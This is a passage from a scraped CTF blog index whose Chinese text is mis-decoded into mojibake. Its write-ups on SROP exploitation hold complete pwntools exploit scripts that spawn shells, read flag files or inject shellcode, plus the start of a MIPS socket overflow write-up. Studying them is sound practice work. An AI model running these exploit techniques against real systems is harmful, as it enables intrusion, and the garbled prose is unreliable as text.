&lt;pre&gt;&lt;code&gt;docker images #æŸ¥çœ‹imagesï¼Œæ‰¾åˆ°å¯¹åº”é•œåƒid
docker save $id -o 1.zip #ä»¥1.zipå½¢å¼ä¿å­˜é•œåƒè‡³å½“å‰ç›®å½•
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472029342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;new-terminal&#34;&gt;New Terminalï¼š&lt;/h4&gt;
&lt;p&gt;ç»™äº†ä¸€ä¸ª&lt;code&gt;.wasm&lt;/code&gt;æ–‡ä»¶ï¼Œä½¿ç”¨wasmtimeè¿è¡Œ&lt;br&gt;
å¯ä»¥å¾—åˆ°ä¸€ä¸ªshell,æ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat flag|base 64
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°flagï¼Œcyberchef base64ä¸€æŠŠæ¢­å³å¯&lt;/p&gt;
">NSS_2nd éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bO-O2aCV6/"" data-c="
          &lt;p&gt;å‚è€ƒ:&lt;br&gt;
&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/&#34;&gt;link1&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://cjovi.icu/WP/buu-360chunqiu2017_smallest-wp.html&#34;&gt;link2&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ciscn-2019åå—pwn3&#34;&gt;[CISCN 2019åå—]PWN3&lt;/h3&gt;
&lt;p&gt;sropçš„å‰ç½®æ¡ä»¶ï¼Œæœ¬é¢˜éƒ½å¯ä»¥æ‰¾åˆ°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349095006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¿æŠ¤åªå¼€äº†nxï¼Œida stringsé‡Œé¢ä¹Ÿæ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰&lt;br&gt;
æœ¬é¢˜å…³é”®å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677348479590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤å¤„&lt;code&gt;sys_read&lt;/code&gt;å‡½æ•°å¯ä»¥å°†è¯»å…¥çš„å­—ç¬¦ä¸²ä»&lt;code&gt;$rbp-0x10&lt;/code&gt;å¤„å¼€å§‹å†™å…¥æ ˆä¸Šï¼Œå¯ä»¥å°†&lt;code&gt;/bin/sh&lt;/code&gt;å†™å…¥æ–¹ä¾¿åç»­åˆ©ç”¨ï¼Œæ‰€ä»¥payload1å¯ä»¥è¿™æ ·æ„é€ &lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(sys_read)&lt;/code&gt;&lt;br&gt;
è€Œéšåçš„&lt;code&gt;sys_write&lt;/code&gt;åˆ™å°†&lt;code&gt;$rbp-0x10&lt;/code&gt;å¾€å0x30 bytesçš„æ•°æ®æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ³„éœ²signal frameçš„stack addrå¹¶æµ‹ç®—è·ç¦»&lt;code&gt;/bin/sh&lt;/code&gt;å­—ç¬¦ä¸²åç§»ï¼Œé€šè¿‡å·²çŸ¥åœ°å€åç§»ç¡®å®š&lt;code&gt;/bin/sh&lt;/code&gt;å­—ç¬¦ä¸²å…·ä½“ä½ç½®&lt;br&gt;
gdbåŠ¨è°ƒå¯ä»¥æ‰¾å‡ºæ¥åç§»ä¸º296&amp;lt;=&amp;gt;0x128   (æœ¬åœ°è°ƒå‡ºæ¥è¿™ä¹ˆå¤šèƒ½æ‰“é€šï¼Œè¿œç«¯å°±æ‰“ä¸é€šï¼Œè¿œç«¯åç§»0x118ï¼Œæƒ…å†µè·Ÿæœ¬åœ°åç€æ¥ğŸ˜…ğŸ˜…ğŸ˜…)&lt;br&gt;
7/18æ›´æ–°ï¼šSROPçš„æ ˆåç§»ä¸åŒç³»ç»Ÿåç§»ä¸åŒ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349148648.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æµ‹å‡ºåç§»ååˆ©ç”¨pwntoolsè‡ªå¸¦å‡½æ•°&lt;code&gt;SigreturnFrame()&lt;/code&gt;å¼€å§‹æ„é€ &lt;br&gt;
ä¹‹åå› ä¸ºå‰é¢retè¿”å›&lt;code&gt;vuln&lt;/code&gt;èµ·å§‹ï¼Œéœ€è¦é‡æ–°è¾“å…¥æº¢å‡ºï¼Œåˆ™payload2å¯ä»¥è¿™æ ·æ„é€ &lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)&lt;/code&gt;&lt;br&gt;
éšåget shell&lt;br&gt;
expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28623)

vuln=0x4004ed
syscall=0x400517
mov_rax_0xf=0x4004da

# gdb.attach(io)
# pause()

payload=p64(vuln)*3
io.send(payload)

stack_addr=u64(io.recv()[0x20:0x28])
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

str_bin_sh=stack_addr-0x118

sigframe=SigreturnFrame()
sigframe.rax=59
sigframe.rdi=str_bin_sh
sigframe.rsi=0
sigframe.rsp=stack_addr
sigframe.rdx=0
sigframe.rip=syscall

payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;360chunqiu2017_smallest&#34;&gt;360chunqiu2017_smallest&lt;/h3&gt;
&lt;p&gt;åªæœ‰ä¸€æ¬¡read_sys,ä½†æ˜¯ç›´æ¥è¯»åˆ°rspä¸Š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689677310959.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
éœ€è¦ç¬¬ä¸€æ¬¡è¿”å›æ—¶ä¿®æ”¹ä½1å­—èŠ‚è·³è¿‡&lt;code&gt;xor rax,rax&lt;/code&gt;å‘½ä»¤ï¼Œä½¿å¾—raxä¸ä¸º0ï¼Œä»è€Œæ‰§è¡Œwrite_sysæ³„éœ²æ ˆåœ°å€ï¼Œç¬¬ä¸‰æ¬¡æ—¶æ„é€ readå¾€æ ˆä¸Šè¯»ï¼Œæœ€åæ„é€ execveæ‰§è¡Œå³å¯&lt;br&gt;
æ³¨æ„sleepï¼Œä¸èƒ½å‘å¤ªå¿«ï¼Œå‘å¤ªå¿«è¿œç«¯ä¼šç‚¸&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./smallest&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28027)

main=0x4000b0
syscall=0x4000be

payload=p64(main)*3
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\xb3&amp;quot;)
stack_addr=u64(io.recv()[0x8:0x10])
# stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=stack_addr
sigframe.rsp=stack_addr
sigframe.rdx=0x400
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe) #å…«ä¸ªå­—èŠ‚padding,å‡ºå»ä¿¡å·æœºåˆ¶çš„popå½±å“
io.send(payload)

sleep(1)  #è¿œç«¯é˜²ç‚¸

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

#execve
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr+0x190
sigframe.rsp=stack_addr
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe)
payload=payload.ljust(0x190,b&amp;quot;\x00&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

sleep(1)

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nepctf_srop&#34;&gt;nepctf_srop&lt;/h3&gt;
&lt;p&gt;å¼€å¯æ²™ç›’ï¼Œorw&lt;br&gt;
æ­¤é¢˜æ²¡æœ‰&lt;code&gt;syscall;ret&lt;/code&gt;çš„gadgetï¼Œåªæœ‰&lt;code&gt;syscall()&lt;/code&gt;å‡½æ•°ï¼Œ&lt;code&gt;syscall()&lt;/code&gt;å‡½æ•°å¯ä»¥é€šè¿‡æ§åˆ¶&lt;code&gt;$rdi&lt;/code&gt;æ¥æ§åˆ¶&lt;code&gt;$rax&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov     rax, rdi
mov     rdi, rsi
mov     rsi, rdx
mov     rdx, rcx
mov     r10, r8
mov     r8, r9
mov     r9, [rsp+arg_0]
syscall      
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åªç»™äº†ä¸€æ¬¡è¯»å…¥çš„æœºä¼šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸€æ¬¡è¯»å…¥è°ƒç”¨&lt;code&gt;read&lt;/code&gt;è¯»åˆ°bssæ®µå®ç°æ ˆè¿ç§»ä¸Šæ‰“orw&lt;br&gt;
orwçš„å®ç°å‡ç”±&lt;code&gt;syscall()&lt;/code&gt;å‡½æ•°å®ç°&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)

buf_addr=0x601200
syscall=0x4005B0
pop_rdi=0x400813
flag=buf_addr+0x600

io.recvuntil(b&amp;quot;2023!\n&amp;quot;)

#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rdi=0 #read ç³»ç»Ÿè°ƒç”¨å·
sigframe.rsi=0 #stdin æ ‡å‡†è¾“å…¥
sigframe.rdx=buf_addr #buf
sigframe.rcx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall

payload=cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)


gdb.attach(io)
pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rdi=2 #open ç³»ç»Ÿè°ƒç”¨å·
sigframe_open.rsi=flag #filename
sigframe_open.rdx=0 
sigframe_open.rcx=0
sigframe_open.rsp=buf_addr+0x200 # top addr
sigframe_open.rip=syscall

payload=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_open)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rdi=0 #read ç³»ç»Ÿè°ƒç”¨å·
sigframe_read.rsi=3 #fd
sigframe_read.rdx=flag+0x100 #buf
sigframe_read.rcx=0x50 #size
sigframe_read.rsp=buf_addr+0x400 # top addr
sigframe_read.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_read)
payload=payload.ljust(0x400,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rdi=1 #write ç³»ç»Ÿè°ƒç”¨å·
sigframe_write.rsi=1 #stdout æ ‡å‡†è¾“å‡º
sigframe_write.rdx=flag+0x100 #buf
sigframe_write.rcx=0x50 #size
sigframe_write.rsp=buf_addr+0x600 # top addr
sigframe_write.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_write)
payload=payload.ljust(0x600,b&amp;quot;a&amp;quot;)+b&amp;quot;flag.txt\x00&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rootersctf_2019_srop&#34;&gt;rootersctf_2019_srop&lt;/h3&gt;
&lt;p&gt;ç»™çš„&lt;code&gt;syscall;leave;retn&lt;/code&gt;çš„gadget&lt;br&gt;
ä¸ç”¨leakå‡ºæ ˆåœ°å€ï¼Œç›´æ¥åœ¨bssæ®µä¸Šä¼ªé€ æ ˆè¯»å…¥å°±è¡Œäº†ï¼Œæ³¨æ„æŒ‡å®š&lt;code&gt;$rbp&lt;/code&gt;ï¼Œä¸ç„¶å¯èƒ½å¡ä½&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26176)
elf=ELF(&amp;quot;./pwn&amp;quot;)

pop_syscall=0x401032
syscall_leave_ret=0x401033
buf_addr=0x402200
sh_addr=buf_addr+0x200

io.recvuntil(b&amp;quot;CTF?\n&amp;quot;)

sigframe=SigreturnFrame()
sigframe.rax=0
sigframe.rdi=0
sigframe.rsi=buf_addr
sigframe.rdx=0x800
sigframe.rsp=buf_addr
sigframe.rbp=buf_addr
sigframe.rip=syscall_leave_ret

payload=cyclic(0x88)+p64(pop_syscall)+p64(0xf)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


sigframe_exec=SigreturnFrame()
sigframe_exec.rax=59
sigframe_exec.rdi=sh_addr
sigframe_exec.rsi=0
sigframe_exec.rdx=0
sigframe_exec.rsp=buf_addr+0x200
sigframe_exec.rip=syscall_leave_ret

payload=p64(0)+p64(pop_syscall)+p64(0xf)+bytes(sigframe_exec)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;aout&#34;&gt;a.out&lt;/h3&gt;
&lt;p&gt;æ•´ä¸ªç¨‹åºå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0000000000401000                               ; =============== S U B R O U T I N E =======================================
.text:0000000000401000
.text:0000000000401000
.text:0000000000401000                               ; signed __int64 start()
.text:0000000000401000                               public _start
.text:0000000000401000                               _start proc near                        ; DATA XREF: LOAD:0000000000400018â†‘o
.text:0000000000401000                                                                       ; LOAD:0000000000400088â†‘o
.text:0000000000401000 B8 01 00 00 00                mov     eax, 1
.text:0000000000401005 BF 01 00 00 00                mov     edi, 1                          ; fd
.text:000000000040100A 48 BE 00 20 40 00 00 00 00 00 mov     rsi, offset msg                 ; &amp;quot;Hello Pwn&amp;quot;
.text:0000000000401014 BA 09 00 00 00                mov     edx, 9                          ; count
.text:0000000000401019 0F 05                         syscall                                 ; LINUX - sys_write
.text:000000000040101B B8 00 00 00 00                mov     eax, 0
.text:0000000000401020 48 89 E6                      mov     rsi, rsp                        ; buf
.text:0000000000401023 BF 00 00 00 00                mov     edi, 0                          ; fd
.text:0000000000401028 BA 90 01 00 00                mov     edx, 190h                       ; count
.text:000000000040102D 0F 05                         syscall                                 ; LINUX - sys_read
.text:000000000040102F C3                            retn
.text:000000000040102F
.text:000000000040102F                               _start endp
.text:000000000040102F
.text:0000000000401030                               ; ---------------------------------------------------------------------------
.text:0000000000401030 48 D1 E0                      shl     rax, 1
.text:0000000000401033 C3                            retn
.text:0000000000401033
.text:0000000000401034                               ; ---------------------------------------------------------------------------
.text:0000000000401034 B9 01 00 00 00                mov     ecx, 1
.text:0000000000401039 48 31 C8                      xor     rax, rcx
.text:000000000040103C C3                            retn
.text:000000000040103C
.text:000000000040103D                               ; ---------------------------------------------------------------------------
.text:000000000040103D 48 31 C0                      xor     rax, rax
.text:0000000000401040 C3                            retn
.text:0000000000401040
.text:0000000000401040                               _text ends
.text:0000000000401040
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sropï¼Œéœ€è¦æ‰‹åŠ¨æ„é€ raxçš„å€¼ä¸º0xfè§¦å‘sigframe&lt;br&gt;
è¿˜æ˜¯è€æ ·å­ä¼ªé€ æ ˆåœ¨bssä¸Šæ‰“ï¼Œé¢˜ç›®å·²ç»ç»™å‡º&lt;code&gt;/bin/sh&lt;/code&gt;çš„åœ°å€&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./a&amp;quot;)

syscall_ret=0x40102d
str_sh=0x40200A
ret_wt=0x401014
bss_addr=0x402200
shl_rax=0x401030
xor_1=0x401034 
xor_rax=0x40103D 

gdb.attach(io)
pause()

#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=bss_addr
sigframe.rdx=0x800
sigframe.rsp=bss_addr
sigframe.rbp=bss_addr
sigframe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe)
io.sendafter(b&amp;quot;Pwn&amp;quot;,payload)

sleep(3)


sigframe_exe=SigreturnFrame()
sigframe_exe.rax=constants.SYS_execve
sigframe_exe.rdi=str_sh
sigframe_exe.rsp=bss_addr
sigframe_exe.rbp=bss_addr
sigframe_exe.rsi=0
sigframe_exe.rdx=0
sigframe_exe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe_exe)
# payload=b&amp;quot;aaaaaqaaaaaaa&amp;quot;
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame2023_srop&#34;&gt;0xGame2023_srop:&lt;/h3&gt;
&lt;p&gt;0xä¸¤é“é¢˜éƒ½èƒ½ç”¨è¿™ä¸ªæ‰“&lt;br&gt;
fake stackæ‰“orw&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./srop-revenge&amp;quot;)
io=remote(&amp;quot;8.130.35.16&amp;quot;,55003)
elf=ELF(&amp;quot;./srop-revenge&amp;quot;)

buf_addr=0x404800
syscall_ret=0x40138b
pop_rax=0x401390
flag=buf_addr+0x450


#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rax=0 #read ç³»ç»Ÿè°ƒç”¨å·
sigframe.rdi=0 #stdin æ ‡å‡†è¾“å…¥
sigframe.rsi=buf_addr #buf
sigframe.rdx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall_ret

payload=cyclic(0x10)+p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rax=2 #open ç³»ç»Ÿè°ƒç”¨å·
sigframe_open.rdi=flag #filename
sigframe_open.rsi=0 
sigframe_open.rdx=0
sigframe_open.rsp=buf_addr+0x150 # top addr
sigframe_open.rip=syscall_ret

payload=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_open)
payload=payload.ljust(0x150,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rax=0 #read ç³»ç»Ÿè°ƒç”¨å·
sigframe_read.rdi=3 #fd
sigframe_read.rsi=flag+0x100 #buf
sigframe_read.rdx=0x50 #size
sigframe_read.rsp=buf_addr+0x300 # top addr
sigframe_read.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_read)
payload=payload.ljust(0x300,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rax=1 #write ç³»ç»Ÿè°ƒç”¨å·
sigframe_write.rdi=1 #stdout æ ‡å‡†è¾“å‡º
sigframe_write.rsi=flag+0x100 #buf
sigframe_write.rdx=0x50 #size
sigframe_write.rsp=buf_addr+0x450 # top addr
sigframe_write.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_write)
payload=payload.ljust(0x450,b&amp;quot;a&amp;quot;)+b&amp;quot;flag&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;htb_sick_rop&#34;&gt;htb_sick_rop:&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨readè¯»0xfæ„é€ sigreturnï¼Œç„¶åmprotectå¼€å†™æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sick_rop&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,30061)
elf=ELF(&amp;quot;./sick_rop&amp;quot;)
libc=elf.libc

read_text=0x401040
write_fuc=0x401017
write_text=0x401048
vuln=0x40102e
leave_ret=0x40104d
syscall_ret=0x401014
sc_addr=0x4010f8

# mprotect
sigframe=SigreturnFrame()
sigframe.rax=10  # mprotect
sigframe.rdi=0x401000  # addr
sigframe.rsi=0x1000 # len
sigframe.rdx=0x7 # flag
sigframe.rsp=0x4010f0 # ret to _start
sigframe.rip=syscall_ret

payload=cyclic(0x28)+p64(vuln)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)

# gdb.attach(io)
# pause()

payload=b&amp;quot;a&amp;quot;*0xf
io.send(payload)

shellcode=asm(shellcraft.sh())
payload=cyclic(0x28)+p64(sc_addr)+shellcode
io.send(payload)


io.interactive()

# 0x000000000040104d : leave ; ret
# 0x0000000000401016 : ret
# 0x0000000000401014 : syscall ; ret
&lt;/code&gt;&lt;/pre&gt;
">SROP</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/KBygv4GCN/"" data-c="
          &lt;h3 id=&#34;å‰è¨€&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
&lt;p&gt;æ‘¸äº†2å¤©ğŸŸæŠŠè¿™ä¸ªçœ‹äº†ä¸€ä¸‹ï¼Œç¬¬ä¸€å¤©æœ¬æ¥èƒ½å¤Ÿå‡ºçš„ï¼Œç»“æœæ‰¾çš„gadgetå¡åœ¨swè¯­å¥ä¸æ‰§è¡Œäº†ï¼Œgdbçˆ†warning &lt;code&gt;can&#39;t find the start of the function at xxx&lt;/code&gt;ï¼Œç½‘ç»œä¸Šè¯´æ˜¯æ— æ³•è®¿é—®å…±äº«åº“çš„é—®é¢˜ğŸ˜“ï¼›&lt;br&gt;
ç¬¬äºŒå¤©é‡æ–°æ‰¾äº†å‡ ä¸ªgadgetç»“æœæœ€ååˆå‡ºç°åŒæ ·çš„é—®é¢˜ï¼Œæœ€ååˆé‡æ–°æ‰¾äº†å‡ ä¸ªgadgetå°½å¯èƒ½ç®€åŒ–äº†æ“ä½œæ•°æ‰æ‰“é€š&lt;/p&gt;
&lt;h3 id=&#34;æ¦‚è¿°&#34;&gt;æ¦‚è¿°ï¼š&lt;/h3&gt;
&lt;p&gt;æœ¬é¢˜æº¢å‡ºç‚¹å­˜åœ¨äº&lt;code&gt;sprintf&lt;/code&gt;å‡½æ•°æ‹¼æ¥å˜é‡&lt;code&gt;v10&lt;/code&gt;é•¿åº¦è¶…è¿‡&lt;code&gt;v11&lt;/code&gt;ç¼“å†²åŒºå¤§å°ï¼Œå¯ä»¥å¯¼è‡´&lt;code&gt;v11&lt;/code&gt;æ ˆæº¢å‡º&lt;br&gt;
æœ¬é¢˜æ•°æ®ä¼ è¾“é€šè¿‡socketï¼Œbashè„šæœ¬æŒ‡å®šç«¯å£åˆå§‹åŒ–å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./socket_bof &amp;quot;9999&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€å¼€å§‹æˆ‘ä»¬gdb-multiarch remoteåˆ°1234ç«¯å£ååœ¨ç¨‹åºå»ºç«‹ç›‘å¬çš„å‡½æ•°åä¸‹æ–­ç‚¹cè¿‡å»ï¼Œç„¶åä½¿ç”¨cyclicè„šæœ¬æµ‹ç®—åç§»ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

payload=cyclic(0x300)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æµ‹å‡ºåç§»ä¸º51&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1692793724271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç€æ‰‹expçš„ç¼–å†™&lt;br&gt;
ä¸ºäº†ç»•è¿‡MIPSæ¶æ„çš„ç¼“å­˜ä¸ä¸€è‡´æ€§ï¼Œæˆ‘ä»¬éœ€è¦ä¸»åŠ¨è°ƒç”¨&lt;code&gt;sleep()&lt;/code&gt;æ¥ä½¿å†™å…¥çš„shellcodeä»&lt;code&gt;D-Cache&lt;/code&gt;åˆ·æ–°åˆ°&lt;code&gt;I-Cache&lt;/code&gt;ï¼Œæ‰€ä»¥expç¼–å†™æµç¨‹ä¸å‰æ–‡ä¸åŒ&lt;br&gt;
å¤§è‡´æµç¨‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.ç¡®ä¿èƒ½æº¢å‡ºåˆ°$ra
2.å¯»æ‰¾gadgetå°†$a0å€¼è®¾ä¸º1ï¼Œå³sleepçš„å‚æ•°
3.å¯»æ‰¾gadgetæ‰§è¡Œlibcä¸­çš„sleepå¹¶èƒ½å¤Ÿè¿”å›åˆ°ä¸‹ä¸€ä¸ªgadget
4.å¯»æ‰¾gadgetå°†åŒ…å«shellcodeçš„æ ˆåœ°å€å‚¨å­˜åˆ°å¯„å­˜å™¨ä¸­
